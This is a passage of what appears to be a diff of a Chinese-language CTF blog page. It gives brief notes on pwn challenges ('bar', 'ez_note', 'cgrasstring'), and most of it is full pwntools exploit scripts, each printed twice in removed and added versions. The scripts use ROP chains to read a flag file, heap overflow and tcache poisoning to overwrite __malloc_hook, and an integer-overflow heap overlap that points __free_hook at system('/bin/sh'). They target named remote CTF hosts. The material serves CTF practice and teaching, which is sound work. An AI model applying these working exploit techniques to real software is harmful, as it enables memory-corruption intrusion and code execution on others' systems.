'amd64')</span><br><span class="line">#context(log_level = 'debug', os = 'linux', arch = 'i386')</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(14),16)</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru("Let's check your identity")</span><br><span class="line">#sl(b"sselemaN")</span><br><span class="line">s(b'AANameless')</span><br><span class="line">#sl(b'A'*2+p64(0x7373656c656d614e))</span><br><span class="line">io.recvuntil("Here you are:")</span><br><span class="line">gift=iuu64()</span><br><span class="line">print("gift:"+hex(gift))</span><br><span class="line">base=gift-0x4050</span><br><span class="line">leave_ret=0x00000000000012d8+base</span><br><span class="line">pop_rdi=base+0x00000000000014d3</span><br><span class="line">pop_rsi_r15=0x00000000000014d1+base</span><br><span class="line">puts_plt=elf.plt['puts']+base</span><br><span class="line">puts_got=elf.got['puts']+base</span><br><span class="line">read_plt=elf.plt['read']+base</span><br><span class="line">main=0x1428+base</span><br><span class="line"></span><br><span class="line">payload=b'\x00'*0x60+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">ru("And pls write your own information on it")</span><br><span class="line">s(payload)</span><br><span class="line">ru("Tell me your wish:")</span><br><span class="line">payload=p64(gift+0x60-8)+p64(leave_ret)</span><br><span class="line">s(payload)</span><br><span class="line">gdb.attach(io,'b *gift')</span><br><span class="line">libcbase=uu64()-libc.sym['puts']</span><br><span class="line">open_addr=libcbase+libc.sym['open']</span><br><span class="line">pop_rsi = libcbase + 0x27529</span><br><span class="line">pop_rdx_rbx = libcbase + 0x1626d6</span><br><span class="line">write_addr=libcbase+libc.sym['write']</span><br><span class="line">read_addr=libcbase+libc.sym['read']</span><br><span class="line">puts_addr=libcbase+libc.sym['puts']</span><br><span class="line"></span><br><span class="line">orw=b'./flag'.ljust(8,b'\x00')+ b'\x00' * 0x70 + p64(pop_rdi) + p64(gift) + p64(pop_rsi) + p64(0) + p64(open_addr)</span><br><span class="line">orw+= p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(gift + 8) + p64(pop_rdx_rbx) + p64(0x30) + p64(0) + p64(read_plt)</span><br><span class="line">orw+=p64(pop_rdi)+p64(1)+p64(write_addr)</span><br><span class="line"></span><br><span class="line">s(orw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></tbody></table></figure>
 
 <h1 id="bar"><a href="#bar" class="headerlink" title="bar"></a>bar</h1><p>一道比较简单的堆题，首先3选项可以直接泄露出libc，而且uaf,堆溢出都有</p>
 <p>首先泄露出libc，接着利用堆溢出构造出unsorted bin，使得堆块重叠，任意修改tcache的fd指针打malloc_hook</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">banary = &quot;./bar&quot;</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">#libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">libc=ELF(&quot;/home/youlin/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&quot;)</span><br><span class="line">ip = &#x27;1.14.71.254&#x27;</span><br><span class="line">port = 28581</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)</span><br><span class="line">#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b&quot;\xff&quot;)[-4:].ljust(4, b&#x27;\x00&#x27;))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(15),16)</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line">def cmd(choice):</span><br><span class="line">    sla(&quot;Your choice:&quot;,str(choice))</span><br><span class="line"></span><br><span class="line">def add(choice,content):</span><br><span class="line">    cmd(1)</span><br><span class="line">    sla(&quot;Whisky , brandy or Vodka?&quot;,str(choice))</span><br><span class="line">    sla(&quot;You may want to tell sth to the waiter:&quot;,content)</span><br><span class="line"></span><br><span class="line">def delete(idx, size):</span><br><span class="line">    cmd(2)</span><br><span class="line">    sla(b&#x27;Which?&#x27;, str(idx))</span><br><span class="line">    sla(b&#x27;How much?&#x27;, str(size))</span><br><span class="line"></span><br><span class="line">def leak():</span><br><span class="line">    cmd(3)</span><br><span class="line"></span><br><span class="line">leak()</span><br><span class="line">ru(&quot;We will give everyone only one cup of icecream!&quot;)</span><br><span class="line">libcbase=iuu64()-0x1ec6a0</span><br><span class="line">onegadget=libcbase+0xe6af1</span><br><span class="line">malloc_hook=libcbase+libc.sym[&#x27;__malloc_hook&#x27;]</span><br><span class="line">lg=(&#x27;libcbase&#x27;)</span><br><span class="line"></span><br><span class="line">add(0,b&#x27;youlin&#x27;)#0</span><br><span class="line">add(0,b&#x27;youlin&#x27;)#1</span><br><span class="line">add(2,b&#x27;youlin&#x27;)#2</span><br><span class="line">add(2,b&#x27;youlin&#x27;)#3</span><br><span class="line">add(2,b&#x27;youlin&#x27;)#4</span><br><span class="line">add(0,b&#x27;youlin&#x27;)#5</span><br><span class="line">add(0,b&#x27;youlin&#x27;)#6</span><br><span class="line">add(0,b&#x27;youlin&#x27;)#7</span><br><span class="line">add(0,b&#x27;youlin&#x27;)#8</span><br><span class="line"></span><br><span class="line">delete(3,0x40)</span><br><span class="line">delete(2,0x40)</span><br><span class="line">delete(0,0x100)</span><br><span class="line">add(0,b&#x27;A&#x27;*0xf8+p64(0x421))</span><br><span class="line">delete(1,0x100)</span><br><span class="line"></span><br><span class="line">add(1,b&#x27;youlin&#x27;)</span><br><span class="line">add(0,b&#x27;A&#x27;*0x98+p64(0x51)+p64(malloc_hook-0x10))</span><br><span class="line"></span><br><span class="line">add(2,b&#x27;youlin&#x27;)</span><br><span class="line">add(2,p64(onegadget))</span><br><span class="line"></span><br><span class="line">add(1,b&#x27;youlin&#x27;)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">banary = "./bar"</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">#libc = ELF("./libc.so.6")</span><br><span class="line">libc=ELF("/home/youlin/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so")</span><br><span class="line">ip = '1.14.71.254'</span><br><span class="line">port = 28581</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = 'debug', os = 'linux', arch = 'amd64')</span><br><span class="line">#context(log_level = 'debug', os = 'linux', arch = 'i386')</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(15),16)</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line">def cmd(choice):</span><br><span class="line">    sla("Your choice:",str(choice))</span><br><span class="line"></span><br><span class="line">def add(choice,content):</span><br><span class="line">    cmd(1)</span><br><span class="line">    sla("Whisky , brandy or Vodka?",str(choice))</span><br><span class="line">    sla("You may want to tell sth to the waiter:",content)</span><br><span class="line"></span><br><span class="line">def delete(idx, size):</span><br><span class="line">    cmd(2)</span><br><span class="line">    sla(b'Which?', str(idx))</span><br><span class="line">    sla(b'How much?', str(size))</span><br><span class="line"></span><br><span class="line">def leak():</span><br><span class="line">    cmd(3)</span><br><span class="line"></span><br><span class="line">leak()</span><br><span class="line">ru("We will give everyone only one cup of icecream!")</span><br><span class="line">libcbase=iuu64()-0x1ec6a0</span><br><span class="line">onegadget=libcbase+0xe6af1</span><br><span class="line">malloc_hook=libcbase+libc.sym['__malloc_hook']</span><br><span class="line">lg=('libcbase')</span><br><span class="line"></span><br><span class="line">add(0,b'youlin')#0</span><br><span class="line">add(0,b'youlin')#1</span><br><span class="line">add(2,b'youlin')#2</span><br><span class="line">add(2,b'youlin')#3</span><br><span class="line">add(2,b'youlin')#4</span><br><span class="line">add(0,b'youlin')#5</span><br><span class="line">add(0,b'youlin')#6</span><br><span class="line">add(0,b'youlin')#7</span><br><span class="line">add(0,b'youlin')#8</span><br><span class="line"></span><br><span class="line">delete(3,0x40)</span><br><span class="line">delete(2,0x40)</span><br><span class="line">delete(0,0x100)</span><br><span class="line">add(0,b'A'*0xf8+p64(0x421))</span><br><span class="line">delete(1,0x100)</span><br><span class="line"></span><br><span class="line">add(1,b'youlin')</span><br><span class="line">add(0,b'A'*0x98+p64(0x51)+p64(malloc_hook-0x10))</span><br><span class="line"></span><br><span class="line">add(2,b'youlin')</span><br><span class="line">add(2,p64(onegadget))</span><br><span class="line"></span><br><span class="line">add(1,b'youlin')</span><br><span class="line">ia()</span><br></pre></td></tr></tbody></table></figure>
 
 <h1 id="ez-note"><a href="#ez-note" class="headerlink" title="ez_note"></a>ez_note</h1><p>整数溢出造成的堆溢出，利用溢出修改出unsorted的size大小，造成堆重叠</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">banary = &quot;./pwn&quot;</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">#libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">libc=ELF(&quot;/home/youlin/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&quot;)</span><br><span class="line">ip = &#x27;node4.buuoj.cn&#x27;</span><br><span class="line">port = 29013</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)</span><br><span class="line">#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b&quot;\xff&quot;)[-4:].ljust(4, b&#x27;\x00&#x27;))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(12),16)</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line">def cmd(choice):</span><br><span class="line">    sla(&quot;Your choice:&quot;,str(choice))</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">    cmd(1)</span><br><span class="line">    sa(&quot;Note size:&quot;,str(size))</span><br><span class="line">    sa(&quot;Note content:&quot;,content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    cmd(2)</span><br><span class="line">    sa(&quot;Note ID:&quot;,str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    cmd(3)</span><br><span class="line">    sa(&quot;Note ID:&quot;,str(index))</span><br><span class="line"></span><br><span class="line">def exit():</span><br><span class="line">    cmd(4)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x80,b&#x27;youlin&#x27;)#0</span><br><span class="line">add(0x80,b&#x27;youlin&#x27;)#1</span><br><span class="line">add(0x200,b&#x27;youlin&#x27;)#2</span><br><span class="line">add(0x200,b&#x27;youlin&#x27;)#3</span><br><span class="line">add(0x80,b&#x27;youlin&#x27;)#4</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">payload=b&#x27;A&#x27;*0x80+p64(0)+p64(0x4B1)</span><br><span class="line">add(0x100000080,payload)# 整数溢出 0</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">add(0x80,b&#x27;youlin&#x27;)#1</span><br><span class="line">show(2)</span><br><span class="line">ru(&#x27;Note content:&#x27;)</span><br><span class="line">libcbase=u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))-0x1ebbe0</span><br><span class="line">print(&quot;libcbase:&quot;+hex(libcbase))</span><br><span class="line">system=libcbase+libc.sym[&#x27;system&#x27;]</span><br><span class="line">free_hook=libcbase+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line"></span><br><span class="line">add(0x400,b&#x27;youiln&#x27;)</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">payload=b&#x27;A&#x27;*0x80+p64(0)+p64(0x211)</span><br><span class="line">add(0x100000080,payload) # 1</span><br><span class="line"></span><br><span class="line">delete(3)</span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">payload=b&#x27;A&#x27;*0x80+p64(0)+p64(0x211)+p64(free_hook)</span><br><span class="line">add(0x100000080,payload)    # 1</span><br><span class="line"></span><br><span class="line">add(0x200,b&#x27;/bin/sh\x00&#x27;)    # 2</span><br><span class="line">add(0x200,p64(system)) # 3</span><br><span class="line"></span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">banary = "./pwn"</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">#libc = ELF("./libc.so.6")</span><br><span class="line">libc=ELF("/home/youlin/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so")</span><br><span class="line">ip = 'node4.buuoj.cn'</span><br><span class="line">port = 29013</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = 'debug', os = 'linux', arch = 'amd64')</span><br><span class="line">#context(log_level = 'debug', os = 'linux', arch = 'i386')</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(12),16)</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line">def cmd(choice):</span><br><span class="line">    sla("Your choice:",str(choice))</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">    cmd(1)</span><br><span class="line">    sa("Note size:",str(size))</span><br><span class="line">    sa("Note content:",content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    cmd(2)</span><br><span class="line">    sa("Note ID:",str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    cmd(3)</span><br><span class="line">    sa("Note ID:",str(index))</span><br><span class="line"></span><br><span class="line">def exit():</span><br><span class="line">    cmd(4)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x80,b'youlin')#0</span><br><span class="line">add(0x80,b'youlin')#1</span><br><span class="line">add(0x200,b'youlin')#2</span><br><span class="line">add(0x200,b'youlin')#3</span><br><span class="line">add(0x80,b'youlin')#4</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">payload=b'A'*0x80+p64(0)+p64(0x4B1)</span><br><span class="line">add(0x100000080,payload)# 整数溢出 0</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">add(0x80,b'youlin')#1</span><br><span class="line">show(2)</span><br><span class="line">ru('Note content:')</span><br><span class="line">libcbase=u64(io.recv(6).ljust(8,b'\x00'))-0x1ebbe0</span><br><span class="line">print("libcbase:"+hex(libcbase))</span><br><span class="line">system=libcbase+libc.sym['system']</span><br><span class="line">free_hook=libcbase+libc.sym['__free_hook']</span><br><span class="line"></span><br><span class="line">add(0x400,b'youiln')</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">payload=b'A'*0x80+p64(0)+p64(0x211)</span><br><span class="line">add(0x100000080,payload) # 1</span><br><span class="line"></span><br><span class="line">delete(3)</span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">payload=b'A'*0x80+p64(0)+p64(0x211)+p64(free_hook)</span><br><span class="line">add(0x100000080,payload)    # 1</span><br><span class="line"></span><br><span class="line">add(0x200,b'/bin/sh\x00')    # 2</span><br><span class="line">add(0x200,p64(system)) # 3</span><br><span class="line"></span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></tbody></table></figure>
 
 <h2 id="cgrasstring"><a href="#cgrasstring" class="headerlink" title="cgrasstring"></a>cgrasstring</h2><p>c++的pwn(第一次去看)，ida逆出来的代码有点看不懂，只能跟着wp去理解程序逻辑</p>
 <p>大概就是可以通过change造成uaf，通过unsortedbin 泄露出libc,然后打free_hook</p>
 <p>调试的时候和c语言的堆是差不多的（就是我太菜了，ida逆出来的代码有点看不懂）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">banary = &quot;./cgrasstring&quot;</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">#libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">ip = &#x27;1.14.71.254&#x27;</span><br><span class="line">port = 28581</span><br><span class="line">local = 1</span><br><span 